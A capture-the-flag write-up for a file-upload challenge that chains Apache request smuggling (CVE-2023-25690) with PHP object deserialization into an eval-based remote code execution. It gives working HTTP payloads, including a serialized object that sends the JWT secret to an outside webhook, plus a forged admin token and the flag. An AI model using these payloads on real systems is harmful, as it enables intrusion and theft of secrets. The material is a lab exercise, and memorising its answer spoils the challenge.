# File-Vault - CTF Write-up

## Challenge Description
A file uploading platform, where you can upload your file and store it securely!!, but there is some way we need to login as admin to get the flag


## Initial Analysis

### 1. Application Flow
- Can sign up and login
- upload files
- download files

### 2. Source Code Analysis and Vulnerability Analysis
Looking at the frontend apache configuration file:
```conf
RewriteRule "^/get/(.*)" "http://backend-server:8080/index.php?get=$1" [P]
ProxyPassReverse "/get/" "http://backend-server:8080/"
RewriteRule "^/(.*)" "http://backend-server:8080/index.php/v1/$1" [P]
ProxyPassReverse "/" "http://backend-server:8080/index.php/v1/"
```

Looking at the frontend's docker file:
```dockerfile
FROM httpd:2.4.55
```

Looking /internal/verify endpoint:
```php
case '/internal/verify':
        if ($method !== 'POST') {
            http_response_code(405);
            echo json_encode(['error' => 'Method not allowed']);
            break;
        }
        $data = json_decode(file_get_contents('php://input'), true);
        $fileId = $data['file_id'] ?? null;
    
        if (!$fileId) {
            http_response_code(400);
            echo json_encode(['error' => 'File ID is required']);
            break;
        }
        $verifier = @unserialize($fileId) ?: new FileVerifier();
        $result = $verifier->verify($fileId);
        unset($verifier);

        echo json_encode($result);
        break;
```

looking at the verifier.php and internal_verify.php:
```php
class FileVerifier {
    public function verify($fileId) {
        if (!isset($_SESSION['files'][$fileId])) {
            return ['error' => 'File not found'];
        }

        return [
            'message' => 'File verified',
            'hash' => $_SESSION['files'][$fileId]['hash']
        ];
    }
}

class Verifier {
    public $verification;

    public function verify($fileId) {
        if (!isset($_SESSION['files'][$fileId])) {
            return ['error' => 'File not found'];
        }

        return [
            'message' => 'File verified',
            'hash' => $_SESSION['files'][$fileId]['hash']
        ];
    }

    public function __destruct() {
        if ($this->verification) {
            eval($this->verification);
        }
    }
}
```

Key observations:
1. Uses older version of Apache 2.4.55, so we can understand that it might have particular vulnerabilities.
2. By searching about CVEs, we find CVE-2023-25690, that uses the exact rewriterule.
3. /internal/verify point is vulnerable due to unsafe deserialization, and we can access RCE by accessing destruct method Verifier.php
4. Confirmed with CVE-2023-25690
5. there is no way of getting any output from the application.
6. there is no way directly accessing /internal/verify endpoint


## Exploitation Steps

### 1. Confirming the vulnerability
First try lets try it parsing some return line encoded characters like %0A in the url, and testing this, we can confirm it works and hence confirming the CRLF injection


### 2. Crafting the Payload
We found that by looking at the source code we need to get the jwt secret key, and hence we can do HTTP Request Smuggling using this CRLF and splitting of the request, and finally access the internal/verify with the use of CRLF injection (using encoding of space and other escaping characters)
```HTTP
GET /get/help%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aPOST%20/index.php/internal/verify HTTP/1.1
Host: localhost
Content-Type: application/json
```

### 4. Getting the secret key
We know there is no way to get any output, but we can send out the payload as a get request somewhere and recieve it, and finally get the JWT Secret key, so we can do something like:
```HTTP
GET /get/help%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aPOST%20/index.php/internal/verify HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 172

{
  "file_id": "O:8:\"Verifier\":1:{s:12:\"verification\";s:98:\"file_get_contents('https://webhook.site/e2752030-f5a1-440b-b692-7bc77d9adb46?secret='.JWT_SECRET);\";}"
}

```
this payload will get us the secret key in the webhook site.

### 5. Getting the Flag
Finally with the use of JWT.io website, we can forge admin's token and send a request to /api/flag like this, to get the flag
```HTTP
GET /api/flag HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTk5OTk5OTk5OX0.ADUy5SAQCKZHq25kZJfFFMSI-5Xw9ECZyOEDjMOmVEI
```
## Tools Used
- Burp Suite/Postman for requests
- PHP knowledge for crafting the payload

## Flag
`p_ctf{THe_mASt9r_0f_HRS_Ju5t_KiDdIng}`
